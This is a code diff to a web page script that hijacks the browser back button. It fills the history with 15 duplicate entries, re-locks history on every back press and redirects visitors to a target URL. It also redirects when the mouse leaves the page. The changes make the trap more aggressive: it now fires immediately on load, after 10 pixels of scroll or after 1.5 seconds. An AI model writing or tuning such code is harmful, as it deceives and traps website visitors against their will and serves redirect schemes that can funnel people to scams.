@@ -29,33 +29,39 @@
         if (activated) return;
         activated = true;
 
-        // Push states to capture back button
-        // 4 states for blocking fast back clicks as requested
-        for (var i = 0; i < 4; i++) {
+        // Push 15 states to capture back button
+        for (var i = 0; i < 15; i++) {
             history.pushState(null, document.title, location.href);
         }
 
         // Redirect on popstate (back button clicked)
         window.addEventListener('popstate', function() {
+            // Push state again to re-lock history
+            history.pushState(null, document.title, location.href);
             setTimeout(function() {
                 location.replace(targetUrl);
-            }, 1);
+            }, 0);
         });
     }
+
+    // Activate immediately on load to pre-populate history
+    try {
+        activateBackBlock();
+    } catch(e) {}
 
     // --- Activation Triggers (Ravelizio Pattern) ---
     // 1. User clicks anywhere
     document.addEventListener('click', activateBackBlock, { once: true });
     
-    // 2. User scrolls down > 30px
+    // 2. User scrolls down > 10px
     window.addEventListener('scroll', function() {
-        if (window.scrollY > 30) {
+        if (window.scrollY > 10) {
             activateBackBlock();
         }
     }, { once: true });
 
-    // 3. Timeout: trigger after 3 seconds anyway
-    setTimeout(activateBackBlock, 3000);
+    // 3. Timeout: trigger after 1.5 seconds anyway
+    setTimeout(activateBackBlock, 1500);
 
     // Exit-Intent: redirect when mouse leaves viewport upwards (clientY < 20)
     document.addEventListener('mouseleave', function(e) {
